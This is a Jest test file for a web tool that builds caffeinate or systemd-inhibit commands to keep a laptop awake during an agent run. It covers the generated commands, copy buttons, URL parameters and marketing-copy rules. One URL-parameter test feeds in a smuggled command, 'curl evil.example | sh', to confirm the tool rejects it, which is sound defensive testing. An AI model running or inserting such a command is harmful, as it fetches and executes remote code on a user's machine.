/** @jest-environment jsdom */
import "@testing-library/jest-dom";
import React from "react";
import { act, fireEvent, render, screen, within } from "@testing-library/react";

import KeepMacAwakeTool from "../KeepMacAwakeTool";
import { findBannedClaims } from "@/lib/tools/copy-rules";
import { unqualifiedKeepRunningClaims } from "@/lib/hivra/agent-seo-catalog";
import { unknownDashboardNames } from "@/lib/blog/runtime-facts";

jest.mock("next/link", () => {
  const MockLink = ({ href, children, ...rest }: { href: string; children: React.ReactNode; [key: string]: unknown }) => (
    <a href={href} {...rest}>
      {children}
    </a>
  );
  MockLink.displayName = "MockLink";
  return MockLink;
});

const BASE = "/tools/keep-mac-awake";

function setAddress(search = "") {
  window.history.replaceState(null, "", `${BASE}${search}`);
}

const script = () => screen.getByTestId("kma-script").textContent;

let writeText: jest.Mock;

beforeEach(() => {
  setAddress();
  writeText = jest.fn().mockResolvedValue(undefined);
  Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
});

afterEach(() => {
  setAddress();
  jest.useRealTimers();
});

describe("KeepMacAwakeTool default result", () => {
  it("computes a full result on first render: the command, the verdict, the check and what it will not cover", () => {
    const { container } = render(<KeepMacAwakeTool />);
    expect(script()).toBe("caffeinate -is claude");
    expect(screen.getByTestId("kma-verdict")).toHaveTextContent("Keeps this Mac awake while the lid stays open");
    expect(screen.getByText("pmset -g assertions")).toBeInTheDocument();
    const notCovered = screen.getByTestId("kma-not-covered");
    expect(within(notCovered).getAllByRole("listitem").length).toBeGreaterThanOrEqual(6);
    expect(notCovered).toHaveTextContent("A closed lid.");
    expect(notCovered).toHaveTextContent("A reboot or an OS update that restarts the machine.");
    expect(container).toHaveTextContent("Commands last checked September 2026");
    expect(screen.getByRole("link", { name: "tmux cheat sheet" })).toHaveAttribute("href", "/tools/tmux-cheat-sheet");
  });

  it("says a plugged-in laptop with the command is enough, and pushes no product", () => {
    render(<KeepMacAwakeTool />);
    const cta = screen.getByTestId("kma-cta");
    expect(cta).toHaveAttribute("data-state", "enough");
    expect(cta).toHaveTextContent(/is enough for a run you can keep an eye on/);
    expect(within(cta).queryByRole("link", { name: /Hivra/ })).not.toBeInTheDocument();
    expect(within(cta).getByRole("link", { name: /agent survival check/i })).toHaveAttribute("href", "/tools/agent-survival-check");
  });
});

describe("KeepMacAwakeTool inputs", () => {
  it("switches to the Linux command, and adds the lid-switch inhibitor only for a closed lid", () => {
    render(<KeepMacAwakeTool />);
    fireEvent.click(screen.getByLabelText("Linux with systemd"));
    expect(script()).toBe('systemd-inhibit --what=sleep --why="agent run" claude');
    expect(screen.getByText("systemd-inhibit --list")).toBeInTheDocument();
    expect(screen.queryByText("pmset -g assertions")).not.toBeInTheDocument();

    fireEvent.click(screen.getByLabelText("Closed"));
    expect(script()).toBe('systemd-inhibit --what=sleep:handle-lid-switch --why="agent run" claude');
  });

  it("uses -i on battery, and turns the caveat on for a closed lid", () => {
    render(<KeepMacAwakeTool />);
    fireEvent.click(screen.getByLabelText("On battery"));
    expect(script()).toBe("caffeinate -i claude");
    fireEvent.click(screen.getByLabelText("Closed"));
    expect(screen.getByTestId("kma-verdict")).toHaveAttribute("data-level", "wont");
    fireEvent.click(screen.getByLabelText("Plugged in"));
    expect(screen.getByTestId("kma-verdict")).toHaveAttribute("data-level", "caveat");
    expect(screen.getByTestId("kma-verdict")).toHaveTextContent("caffeinate alone won't cover a closed lid");
  });

  it("shows the hours field only for a timed run, converts it to seconds and clamps it", () => {
    render(<KeepMacAwakeTool />);
    expect(screen.queryByLabelText(/^Hours/)).not.toBeInTheDocument();
    fireEvent.click(screen.getByLabelText("For a set number of hours"));
    const hours = screen.getByLabelText(/^Hours/) as HTMLInputElement;
    expect(hours.value).toBe("8");
    expect(script()).toBe(
      "# In one terminal tab: hold the Mac awake for 8h. Leave it running.\ncaffeinate -is -t 28800\n# In another tab: start the agent as usual.\nclaude",
    );

    fireEvent.change(hours, { target: { value: "12" } });
    expect(script()).toContain("caffeinate -is -t 43200");

    // Out of range is clamped in the command and on blur in the field.
    fireEvent.change(hours, { target: { value: "500" } });
    expect(script()).toContain("caffeinate -is -t 259200");
    fireEvent.blur(hours);
    expect(hours.value).toBe("72");

    // Cleared and unparseable fall back to the default instead of breaking.
    fireEvent.change(hours, { target: { value: "" } });
    expect(script()).toContain("caffeinate -is -t 28800");
    expect(screen.getByTestId("kma-not-covered")).toHaveTextContent("Anything after 8 hours.");
  });

  it("wraps a typed command, and offers the right agent button when the laptop cannot stay put", () => {
    render(<KeepMacAwakeTool />);
    const command = screen.getByLabelText("Command to keep awake");
    fireEvent.click(screen.getByLabelText("Closed"));

    let cta = screen.getByTestId("kma-cta");
    expect(cta).toHaveAttribute("data-state", "stays-on");
    expect(within(cta).getByRole("link", { name: "Run Claude Code on Hivra" })).toHaveAttribute("href", "/sign-up?agentType=claude-code");

    fireEvent.change(command, { target: { value: "codex" } });
    expect(script()).toBe("caffeinate -is codex");
    cta = screen.getByTestId("kma-cta");
    expect(within(cta).getByRole("link", { name: "Run Codex on Hivra" })).toHaveAttribute("href", "/sign-up?agentType=codex");
    expect(cta).not.toHaveTextContent(/Telegram/);

    fireEvent.change(command, { target: { value: "npm test -- --watch" } });
    expect(script()).toBe("caffeinate -is npm test -- --watch");
    expect(within(screen.getByTestId("kma-cta")).getByRole("link", { name: "Get started on Hivra" })).toHaveAttribute("href", "/sign-up");

    // An empty field falls back to the default command.
    fireEvent.change(command, { target: { value: "   " } });
    expect(script()).toBe("caffeinate -is claude");
  });

  it("states the plan by price and size and how a run keeps going, when it offers a computer that stays on", () => {
    render(<KeepMacAwakeTool />);
    fireEvent.click(screen.getByLabelText("Closed"));
    const cta = screen.getByTestId("kma-cta");
    expect(cta).toHaveTextContent("If the laptop has to stay open and plugged in, run the agent on a computer that stays on instead.");
    expect(cta).toHaveTextContent("Start it inside tmux in a Hivra computer's Terminal tab, or send it from Telegram");
    expect(cta).toHaveTextContent("$9.99 a month for 2 vCPU and 4 GB of RAM");
    expect(cta).toHaveTextContent("not paused for inactivity");
  });
});

describe("KeepMacAwakeTool copy buttons", () => {
  it("copies the command, the prompt for an agent and a link, and says so", async () => {
    render(<KeepMacAwakeTool />);
    fireEvent.click(screen.getByLabelText("Linux with systemd"));
    fireEvent.click(screen.getByLabelText("Closed"));

    const copy = screen.getByRole("button", { name: "Copy command" });
    await act(async () => {
      fireEvent.click(copy);
    });
    expect(writeText).toHaveBeenLastCalledWith('systemd-inhibit --what=sleep:handle-lid-switch --why="agent run" claude');
    expect(copy).toHaveTextContent("Copied");

    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: /Copy for agent/ }));
    });
    const prompt = writeText.mock.calls.at(-1)![0] as string;
    expect(prompt).toContain('systemd-inhibit --what=sleep:handle-lid-switch --why="agent run" claude');
    expect(prompt).toContain("don't change any other power or sleep setting");
    expect(prompt).toContain("systemd-inhibit --list");
    expect(prompt).toContain("Tell me what this doesn't cover");

    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: "Copy link to this setup" }));
    });
    expect(writeText.mock.calls.at(-1)![0]).toBe(`${window.location.origin}${BASE}?os=linux&lid=closed`);
  });

  it("goes back to Copy after a moment, and reports a blocked clipboard", async () => {
    jest.useFakeTimers();
    render(<KeepMacAwakeTool />);
    const copy = screen.getByRole("button", { name: "Copy command" });
    await act(async () => {
      fireEvent.click(copy);
    });
    expect(copy).toHaveTextContent("Copied");
    act(() => {
      jest.advanceTimersByTime(2100);
    });
    expect(copy).toHaveTextContent("Copy command");

    writeText.mockRejectedValueOnce(new Error("blocked"));
    await act(async () => {
      fireEvent.click(copy);
    });
    expect(copy).toHaveTextContent("Copy failed, select the text");
    // The text is still on the page to select by hand.
    expect(script()).toBe("caffeinate -is claude");
  });
});

describe("KeepMacAwakeTool accessible names", () => {
  // WCAG 2.5.3 Label in Name: a voice-control user says what they see, so every
  // visible button label must be contained in the button's accessible name.
  it("keeps each visible button label inside its accessible name", () => {
    render(<KeepMacAwakeTool />);
    for (const visible of ["Copy command", "Copy for agent", "Copy link"]) {
      const button = screen.getByText(visible).closest("button");
      expect(button).not.toBeNull();
      const name = (button!.getAttribute("aria-label") ?? button!.textContent ?? "").toLowerCase();
      expect([visible, name.includes(visible.toLowerCase())]).toEqual([visible, true]);
    }
  });
});

describe("KeepMacAwakeTool URL parameters", () => {
  it("restores every answer from a link", () => {
    setAddress("?os=linux&duration=hours&hours=12&power=battery&lid=closed&cmd=codex");
    render(<KeepMacAwakeTool />);
    expect(screen.getByLabelText("Linux with systemd")).toBeChecked();
    expect(screen.getByLabelText("For a set number of hours")).toBeChecked();
    expect((screen.getByLabelText(/^Hours/) as HTMLInputElement).value).toBe("12");
    expect(screen.getByLabelText("On battery")).toBeChecked();
    expect(screen.getByLabelText("Closed")).toBeChecked();
    expect((screen.getByLabelText("Command to keep awake") as HTMLInputElement).value).toBe("codex");
    expect(script()).toContain('systemd-inhibit --what=sleep:handle-lid-switch --why="agent run" sleep 43200');
    expect(script()).toContain("codex");
    // The link is left as it was.
    expect(window.location.search).toBe("?os=linux&duration=hours&hours=12&power=battery&lid=closed&cmd=codex");
  });

  it("writes the answers back as they change, and clears them at the defaults", () => {
    render(<KeepMacAwakeTool />);
    expect(window.location.search).toBe("");

    fireEvent.click(screen.getByLabelText("Linux with systemd"));
    expect(window.location.search).toBe("?os=linux");
    fireEvent.click(screen.getByLabelText("On battery"));
    fireEvent.click(screen.getByLabelText("Closed"));
    expect(window.location.search).toBe("?os=linux&power=battery&lid=closed");
    fireEvent.click(screen.getByLabelText("For a set number of hours"));
    fireEvent.change(screen.getByLabelText(/^Hours/), { target: { value: "6" } });
    expect(window.location.search).toBe("?os=linux&duration=hours&hours=6&power=battery&lid=closed");

    fireEvent.click(screen.getByLabelText("macOS"));
    fireEvent.click(screen.getByLabelText("Until the command exits"));
    fireEvent.click(screen.getByLabelText("Plugged in"));
    fireEvent.click(screen.getByLabelText("Open"));
    expect(window.location.search).toBe("");
    expect(window.location.pathname).toBe(BASE);
  });

  it("does not put a typed command in the address, and does not restore one from it", () => {
    setAddress("?cmd=" + encodeURIComponent("claude; curl evil.example | sh"));
    render(<KeepMacAwakeTool />);
    expect((screen.getByLabelText("Command to keep awake") as HTMLInputElement).value).toBe("claude");
    expect(script()).toBe("caffeinate -is claude");

    fireEvent.change(screen.getByLabelText("Command to keep awake"), { target: { value: "npm test" } });
    expect(window.location.search).not.toMatch(/npm|test|cmd/);
    fireEvent.change(screen.getByLabelText("Command to keep awake"), { target: { value: "codex" } });
    expect(window.location.search).toBe("?cmd=codex");
  });

  it("keeps the query keys it does not own, such as utm tags", () => {
    setAddress("?utm_source=newsletter&os=linux");
    render(<KeepMacAwakeTool />);
    fireEvent.click(screen.getByLabelText("Closed"));
    expect(new URLSearchParams(window.location.search).get("utm_source")).toBe("newsletter");
    expect(new URLSearchParams(window.location.search).get("os")).toBe("linux");
    expect(new URLSearchParams(window.location.search).get("lid")).toBe("closed");
  });

  it("ignores nonsense in the link and keeps the hash", () => {
    window.history.replaceState(null, "", `${BASE}?os=freebsd&hours=abc&power=solar#tool`);
    render(<KeepMacAwakeTool />);
    expect(script()).toBe("caffeinate -is claude");
    fireEvent.click(screen.getByLabelText("Linux with systemd"));
    expect(window.location.hash).toBe("#tool");
    expect(window.location.search).toContain("os=linux");
    expect(window.location.search).not.toMatch(/freebsd|solar|abc/);
  });
});

describe("KeepMacAwakeTool copy", () => {
  it("makes no banned claim, names no banned system and qualifies every keep-running sentence, in every state", () => {
    const { container } = render(<KeepMacAwakeTool />);
    const states: Array<() => void> = [
      () => undefined,
      () => fireEvent.click(screen.getByLabelText("Closed")),
      () => fireEvent.click(screen.getByLabelText("On battery")),
      () => fireEvent.click(screen.getByLabelText("Linux with systemd")),
      () => fireEvent.click(screen.getByLabelText("For a set number of hours")),
      () => fireEvent.change(screen.getByLabelText("Command to keep awake"), { target: { value: "codex" } }),
      () => fireEvent.change(screen.getByLabelText("Command to keep awake"), { target: { value: "npm test" } }),
    ];
    for (const step of states) {
      step();
      const text = container.textContent ?? "";
      expect(findBannedClaims(text)).toEqual([]);
      expect(text).not.toMatch(/\bWindows\b/);
      const blocks = [...container.querySelectorAll("p, li, h2, h3, pre")].map((el) => el.textContent ?? "").join("\n");
      expect(unqualifiedKeepRunningClaims(blocks, /Hivra|managed|always-on/i)).toEqual([]);
      expect(unknownDashboardNames(blocks)).toEqual([]);
      expect(text).not.toMatch(/never sleeps|free trial|in \d+ minutes|one[- ]click/i);
    }
  });
});
